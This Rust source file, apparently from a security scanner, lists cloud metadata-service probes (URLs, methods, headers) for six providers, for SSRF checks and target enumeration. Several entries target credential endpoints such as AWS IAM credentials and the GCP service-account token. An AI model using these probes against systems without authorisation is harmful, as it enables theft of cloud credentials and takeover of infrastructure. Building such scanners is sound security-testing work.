//! Cloud-metadata probe helpers — used by the SSRF check and by power users
//! who want to enumerate the metadata surface of a target's host.

use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum Cloud {
    Aws,
    Gcp,
    Azure,
    DigitalOcean,
    Oracle,
    Alibaba,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MetadataProbe {
    pub cloud: Cloud,
    pub label: &'static str,
    pub method: &'static str,
    pub url: &'static str,
    pub headers: &'static [(&'static str, &'static str)],
}

pub const PROBES: &[MetadataProbe] = &[
    MetadataProbe {
        cloud: Cloud::Aws,
        label: "AWS — IMDSv1 root",
        method: "GET",
        url: "http://169.254.169.254/latest/meta-data/",
        headers: &[],
    },
    MetadataProbe {
        cloud: Cloud::Aws,
        label: "AWS — IMDS IAM creds",
        method: "GET",
        url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        headers: &[],
    },
    MetadataProbe {
        cloud: Cloud::Aws,
        label: "AWS — IMDSv2 token",
        method: "PUT",
        url: "http://169.254.169.254/latest/api/token",
        headers: &[("X-aws-ec2-metadata-token-ttl-seconds", "21600")],
    },
    MetadataProbe {
        cloud: Cloud::Gcp,
        label: "GCP — project metadata root",
        method: "GET",
        url: "http://metadata.google.internal/computeMetadata/v1/",
        headers: &[("Metadata-Flavor", "Google")],
    },
    MetadataProbe {
        cloud: Cloud::Gcp,
        label: "GCP — default SA token",
        method: "GET",
        url: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        headers: &[("Metadata-Flavor", "Google")],
    },
    MetadataProbe {
        cloud: Cloud::Azure,
        label: "Azure — IMDS instance",
        method: "GET",
        url: "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        headers: &[("Metadata", "true")],
    },
    MetadataProbe {
        cloud: Cloud::DigitalOcean,
        label: "DO — droplet metadata",
        method: "GET",
        url: "http://169.254.169.254/metadata/v1/",
        headers: &[],
    },
    MetadataProbe {
        cloud: Cloud::Oracle,
        label: "OCI — instance metadata",
        method: "GET",
        url: "http://169.254.169.254/opc/v2/instance/",
        headers: &[("Authorization", "Bearer Oracle")],
    },
    MetadataProbe {
        cloud: Cloud::Alibaba,
        label: "Aliyun — IMDS",
        method: "GET",
        url: "http://100.100.100.200/latest/meta-data/",
        headers: &[],
    },
];

pub fn probes_for(cloud: Cloud) -> Vec<&'static MetadataProbe> {
    PROBES.iter().filter(|p| p.cloud == cloud).collect()
}
